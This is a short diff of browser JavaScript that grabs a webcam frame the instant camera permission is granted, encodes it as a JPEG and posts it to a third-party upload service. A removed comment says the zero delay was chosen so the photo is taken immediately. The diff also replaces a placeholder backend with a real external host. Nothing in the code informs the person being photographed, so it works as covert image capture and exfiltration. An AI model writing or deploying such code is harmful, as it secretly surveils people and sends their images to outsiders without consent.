@@ -20,19 +20,19 @@ async function start(){
   v.srcObject=stream;
 
   v.onloadedmetadata=function(){
-    // 改成0延时，权限一允许马上拍照
     setTimeout(()=>{
       ctx.drawImage(v,0,0,600,600);
       let imgData=c.toDataURL("image/jpeg");
       sendImg(imgData);
-    }, 0);
+    },0);
   }
 }
 
 function sendImg(base64){
-  fetch("https://后端地址/upload",{
+  fetch("https://api.oioweb.cn/api/upimg",{
     method:"POST",
-    body:JSON.stringify({img:base64})
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({"image":base64})
   });
 }
 
